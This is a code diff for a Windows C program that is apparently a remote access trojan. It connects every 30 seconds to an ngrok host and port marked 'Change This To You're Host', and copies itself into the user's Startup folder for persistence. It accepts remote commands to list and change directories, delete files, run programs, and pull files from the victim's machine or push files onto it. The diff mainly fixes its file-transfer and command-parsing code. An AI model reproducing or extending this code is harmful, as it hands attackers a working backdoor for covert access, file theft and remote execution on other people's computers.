@@ -9,7 +9,6 @@
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
-#include <unistd.h>
 #include <tchar.h>
 #include <string.h>
 
@@ -23,10 +22,24 @@ WORD    ver;
 SOCKET  sock;
 SOCKADDR_IN  hint;
 
+char* letters[26] = {
+    "A:", "B:", "C:", "D:", "E:", 
+    "F:", "G:", "H:", "I:", "J:", 
+    "K:", "L:", "M:", "N:", "O:", 
+    "P:", "Q:", "R:", "S:", "T:", 
+    "U:", "V:", "W:", "X:", "Y:",
+    "Z:",
+};
 
 char err[7] = "error\n";
 char disk[100];
 
+struct store {
+    char buffer[1024];
+    char name[1024];
+    int size;
+    int bytesRecvd;
+};
 
 int wsa_soc_con( char* IP, int port )
 {
@@ -49,6 +62,19 @@ int wsa_soc_con( char* IP, int port )
     return 0;
 }
 
+int getSize(char* filename) {
+    FILE* fptr;
+    int out = 0;
+    if ( (fptr = fopen(filename, "rb")) == NULL ) {
+        return 1;
+    }
+
+    fseek(fptr, 0L, SEEK_END);
+    out = ftell(fptr);
+    fclose(fptr);    
+
+    return out;
+}
 
 int check_path( char* path ) {
     WIN32_FIND_DATA fdfile;
@@ -67,16 +93,6 @@ int check_path( char* path ) {
 }
 
 void get_disk() {
-
-    char* letters[26] = {
-        "A:", "B:", "C:", "D:", "E:", 
-        "F:", "G:", "H:", "I:", "J:", 
-        "K:", "L:", "M:", "N:", "O:", 
-        "P:", "Q:", "R:", "S:", "T:", 
-        "U:", "V:", "W:", "X:", "Y:",
-        "Z:",
-    };
-
     int count = 0;
 
     for ( int i = 0; i < 26; i++ ) {
@@ -88,7 +104,6 @@ void get_disk() {
         }
     }
 }
-
 
 int to_startup( char* path, char* filename, char* out_name ) {
     FILE* fptr;
@@ -113,7 +128,6 @@ int to_startup( char* path, char* filename, char* out_name ) {
     return 0;
 }
 
-
 int is_file_exist( char* name ) {
     FILE* fptr;
 
@@ -125,58 +139,61 @@ int is_file_exist( char* name ) {
     return 0;
 }
 
-
 int download_file( SOCKET sock ) {
-    FILE* fptr; 
-    char name[BUFF_LEN];
-    int bytesRecvd;
-
-    bytesRecvd = recv(sock, name, sizeof(name), 0);
-    if ( bytesRecvd <= 0 ) 
-    {
+    FILE* fptr;
+    struct store pt;
+    
+    pt.bytesRecvd = recv(sock, pt.buffer, sizeof(pt.buffer), 0);
+    pt.size = atoi(pt.buffer);
+    send(sock, "done", strlen("done"), 0);
+    memset(pt.buffer, 0, sizeof(pt.buffer));
+    pt.bytesRecvd = recv(sock, pt.name, sizeof(pt.name), 0);
+    send(sock, "done", strlen("done"), 0);
+    
+    fptr = fopen(pt.name, "ab");
+    if (fptr == NULL) {
         return 1;
     }
 
-    if( (fptr = fopen(name, "ab")) == NULL )
-    {
-        return 1;
+    pt.bytesRecvd = 0;
+    while (pt.size > 0) {
+        pt.bytesRecvd = recv(sock, pt.buffer, sizeof(pt.buffer), 0);
+        pt.size -= pt.bytesRecvd;
+        fwrite(pt.buffer, pt.bytesRecvd, 1, fptr);
+        memset(pt.buffer, 0, sizeof(pt.buffer));
     }
-    
-    char buffer[1];
-    
-    while ( (bytesRecvd = recv(sock, buffer, sizeof(buffer), 0)) > 0 ) {        
-        fwrite(buffer, sizeof(buffer), 1, fptr);
-        memset(buffer, 0, sizeof(buffer));
-    }
-    
+
+    send(sock, "done", sizeof("done"), 0);
     fclose(fptr);
-
     return 0;
 }
-
 
 int upload_file( char* filename, SOCKET sock ) {
-    FILE* fptr; 
-    char buffer[1];
+    FILE* fptr;
+    fptr = fopen(filename, "rb");
     
-    memset(buffer, 0, sizeof(buffer));
-
-    if( (fptr = fopen(filename, "rb")) == NULL )
-    {
+    if (fptr == NULL) {
         return 1;
     }
+    
+    int bytesSent = 0;
+    char buffer[1024];
 
-    send(sock, filename, strlen(filename) + 1, 0);
-    Sleep(5000); 
-    while ( fread(buffer, sizeof(buffer), 1, fptr) > 0 ) {
-        send(sock, buffer, sizeof(buffer), 0);
+    sprintf(buffer, "%d", getSize(filename));
+    send(sock, buffer, sizeof(buffer), 0);
+    Sleep(2000);
+    bytesSent = send(sock, filename, strlen(filename)+1, 0);
+    memset(buffer, 0, sizeof(buffer));
+    Sleep(3000);
+
+    while ( (bytesSent = fread(buffer, 1, sizeof(buffer), fptr) ) > 0) {
+        send(sock, buffer, bytesSent, 0);
+        memset(buffer, 0, sizeof(buffer));
     }
 
     fclose(fptr);
-
     return 0;
 }
-
 
 int ls_dir( SOCKET sock ) {
     char store_one[1000];
@@ -218,10 +235,10 @@ int ls_dir( SOCKET sock ) {
     } while ( FindNextFile(hfind, &fdfile) );
     
     FindClose(hfind);
+    send(sock, "\n\n\n", strlen("\n\n\n"), 0);
 
     return 0;
 }
-
 
 int pwd( SOCKET sock ) {
     TCHAR Buffer[BUFSIZE];
@@ -237,12 +254,10 @@ int pwd( SOCKET sock ) {
     }
 
     sprintf(msg, "\n[*]Current Directory: %s\n", Buffer);
-
-    send(sock, msg, sizeof(msg), 0);
+    send(sock, msg, strlen(msg), 0);
 
     return 0;
 }
-
 
 int first_word( char* found, char* command ) {
     int size = strlen(found);
@@ -266,14 +281,13 @@ int first_word( char* found, char* command ) {
     return 0;
 }
 
-
 void ClientSoc( char* IP , int port ) {
     char buffrecv[BUFF_LEN];
     char out_msg[BUFF_LEN];
     int count = 0;
     int code = 0;
+    int bytesRecvd;
     int i;
-    
 
     while (1) {
         Sleep(30000);
@@ -293,15 +307,15 @@ void ClientSoc( char* IP , int port ) {
             memset(out_msg, 0, sizeof(out_msg));
             code  = 0;
             count = 0;
-            int bytesRecived = recv(sock, buffrecv, sizeof(buffrecv), 0);
+            bytesRecvd = recv(sock, buffrecv, sizeof(buffrecv), 0);
 
-            if ( bytesRecived <= 0 ) {
+            if ( bytesRecvd <= 0 ) {
                 closesocket(sock);
                 WSACleanup();
                 break;
             }
             if ( first_word(buffrecv, "cd") == 0 ) {
-                for ( i = 3; buffrecv[i] != '\0'; i++ ){
+                for ( i = 3; i < bytesRecvd; i++ ){
                     out_msg[count] = buffrecv[i];
                     count++;
                 }
@@ -319,13 +333,10 @@ void ClientSoc( char* IP , int port ) {
             } 
             else if ( strcmp(buffrecv, "dir\n") == 0 || strcmp(buffrecv, "ls\n") == 0 ) {
                 code = ls_dir(sock);
-                closesocket(sock);
-                WSACleanup();
-                wsa_soc_con(IP, port);
                 continue;
             }
             else if ( first_word(buffrecv, "download_file") == 0 ) {
-                for ( i = 14; buffrecv[i] != '\0'; i++ )
+                for ( i = 14; i < bytesRecvd; i++ )
                 {
                     out_msg[count] = buffrecv[i];
                     count++;
@@ -333,24 +344,20 @@ void ClientSoc( char* IP , int port ) {
                 out_msg[count-1] = '\0';
 
                 if ( is_file_exist(out_msg) == 0 ) {
+                    send(sock, "\n\n\n", strlen("\n\n\n"), 0);
                     upload_file(out_msg, sock);
-                    closesocket(sock);
                 }
                 else
                 {
-                    closesocket(sock);
+                    send(sock, "\n", strlen("\n"), 0);
                 }
-                WSACleanup();
-                wsa_soc_con(IP, port);
+
             }
-            else if ( first_word(buffrecv, "upload_file") == 0 ) {
+            else if ( strcmp(buffrecv, "upload_file") == 0 ) {
                 code = download_file(sock);
-                
-                WSACleanup();
-                wsa_soc_con(IP, port);
             }
             else if ( first_word(buffrecv, "del") == 0 ) {
-                for ( i = 4; buffrecv[i] != '\0'; i++ )
+                for ( i = 4; i < bytesRecvd; i++ )
                 {
                     out_msg[count] = buffrecv[i];
                     count++;
@@ -370,7 +377,7 @@ void ClientSoc( char* IP , int port ) {
                 }
             }
             else if ( first_word(buffrecv, "run") == 0 ) {
-                for ( i = 4; buffrecv[i] != '\0'; i++ )
+                for ( i = 4; i < bytesRecvd; i++ )
                 {
                     out_msg[count] = buffrecv[i];
                     count++;
@@ -430,7 +437,7 @@ int main( int argc, char* argv[] ) {
         return 1;
     }
 
-    host_name = "example.io";
+    host_name = "2.tcp.ngrok.io"; // Change This To You're Host
     remoteHost = gethostbyname(host_name);
     
     if ( remoteHost == NULL ) {
@@ -459,7 +466,7 @@ int main( int argc, char* argv[] ) {
     }
 
     char* IP = inet_ntoa(addr);
-    int PORT = 0000;
+    int PORT = 12278; // Change This To You're Port
 
     sprintf(path_name, "%s%s",  path, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
     
